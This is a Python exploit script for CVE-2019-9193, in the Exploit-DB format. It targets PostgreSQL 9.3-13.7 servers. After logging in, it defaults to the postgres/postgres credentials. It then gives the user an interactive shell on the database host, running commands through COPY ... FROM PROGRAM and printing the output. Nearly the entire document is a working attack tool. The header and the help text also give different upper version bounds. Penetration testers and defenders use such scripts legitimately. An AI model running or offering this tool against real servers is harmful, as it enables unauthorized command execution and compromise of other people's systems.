#!/usr/bin/python3

# Exploit Title: PostgreSQL 9.3-13.7 - Remote Code Execution (RCE) (Authenticated)
# Date: 2024-09-17
# Original Exploit Author: b4keSn4ke
# Extended Exploit Author: Damian
# Github: https://github.com/dmyerscough/CVE-2019-9193
# Vendor Homepage: https://www.postgresql.org/
# Software Link: https://www.postgresql.org/download/linux/debian/
# Version: 9.3 - 13.7
# Tested on: Linux x86-64 - Debian 4.19
# CVE: CVE-2019–9193


import argparse
import uuid

import psycopg2


def main(hostname, port, database, username, password, timeout):
    try:
        print(f'[+] Connecting to PostgreSQL Database on {hostname}:{port}')
        connection = psycopg2.connect(
            database=database,
            user=username,
            password=password,
            host=hostname,
            port=port,
            connect_timeout=timeout,
        )

        check_version(connection)
        exploit(connection)
    except psycopg2.OperationalError as err:
        print(f'[-] Connection to Database failed: \r\n{err}')
        exit()


def check_version(connection):
    cursor = connection.cursor()
    cursor.execute("SELECT version()")
    record = cursor.fetchall()
    cursor.close()

    result = deserialize(record)
    version = float(result[(result.find("PostgreSQL")+11):(result.find("PostgreSQL")+11)+4])

    if (version >= 9.3 and version <= 13.7):
        print(f'[+] PostgreSQL {version} is likely vulnerable\n')
        return

    print(f'[-] PostgreSQL {version} is not vulnerable\n')
    exit()


def deserialize(record):
    result = ''
    for rec in record:
        result += f'{rec[0]}\r\n'
    return result


def randomizeTableName():
    return uuid.uuid4().hex


def exploit(connection):
    cursor = connection.cursor()
    tableName = randomizeTableName()

    while True:
        try:
            cmd = input("$ ")

            cursor.execute(f'DROP TABLE IF EXISTS "{tableName}";\
                        CREATE TABLE "{tableName}" (cmd_output text);\
                        COPY "{tableName}" FROM PROGRAM \'{cmd}\';\
                        SELECT * FROM "{tableName}";')

            record = cursor.fetchall()
            result = deserialize(record)

            print(result)

        except psycopg2.errors.ExternalRoutineException as e:
            print(f'{cmd}: {e.pgerror.splitlines()[-1][9:]}')
            cursor.execute("ROLLBACK")
        except (EOFError, KeyboardInterrupt):
            break

    cursor.execute(f'DROP TABLE IF EXISTS "{tableName}";')
    cursor.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CVE-2019–9193 - PostgreSQL 9.3-11.7 Authenticated Remote Code Execution')

    parser.add_argument('-H', '--hostname', type=str, default='127.0.0.1', help='The IP address of the PostgreSQL DB [Default: 127.0.0.1]', required=True)
    parser.add_argument('-p', '--port', type=int, default=5432, help='The port of the PostgreSQL DB [Default: 5432]')
    parser.add_argument('-d', '--database', default='template1', help='Name of the PostgreSQL DB [Default: template1]')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Connection timeout in seconds [Default: 10 (seconds)]')
    parser.add_argument('-U', '--username', default='postgres', help='Username to use to connect to the PostgreSQL DB [Default: postgres]')
    parser.add_argument('-P', '--password', default='postgres', help='Password to use to connect to the the PostgreSQL DB [Default: postgres]')

    args = parser.parse_args()

    main(args.hostname, args.port, args.database, args.username, args.password, args.timeout)
